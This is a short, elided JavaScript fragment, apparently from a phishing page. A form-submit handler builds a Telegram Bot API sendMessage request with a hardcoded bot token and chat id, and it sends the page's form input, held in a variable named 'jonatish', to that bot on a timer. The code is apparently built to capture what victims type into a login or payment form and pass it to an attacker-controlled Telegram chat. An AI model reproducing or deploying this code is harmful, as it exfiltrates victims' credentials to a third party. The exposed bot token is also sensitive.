    ...
    form.addEventListener('submit', function(e) {
        ...
        if (tryCount === 0) {
            ...
            setInterval(() => {
                ...
                const url = `https://api.telegram.org/bot7431454852:AAHCqQOs3StGpfXnMiHXac8Hm5acGV_VBXQ/sendMessage?chat_id=5568772519&text=${encodeURIComponent(jonatish)}&parse_mode=HTML`;
